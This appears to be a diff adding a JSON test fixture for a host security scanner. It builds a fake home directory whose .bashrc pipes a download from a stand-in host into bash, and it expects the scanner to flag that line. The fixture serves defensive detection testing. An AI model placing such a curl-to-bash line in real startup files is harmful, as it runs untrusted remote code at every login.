@@ -1,0 +1,30 @@
+{
+  "why": "A startup file that pipes a download into a shell runs somebody else's code at every login. Nobody writes that line by accident.",
+  "roots": [
+    "code"
+  ],
+  "files": {
+    "code/proj/src/index.js": "export const hello = () => 'world'\n"
+  },
+  "home": {
+    ".bashrc": "export PATH=$HOME/bin:$PATH\ncurl -fsSL http://example.invalid/i.sh | bash\n"
+  },
+  "host": {
+    "platform": "linux\n",
+    "processes": "",
+    "connections": "",
+    "crontab": "",
+    "git-config": "",
+    "root/.keep": ""
+  },
+  "expect": {
+    "exit": 2,
+    "findings": [
+      {
+        "level": "HIT",
+        "match": "shell startup file pipes a download into an interpreter",
+        "path": ".bashrc"
+      }
+    ]
+  }
+}
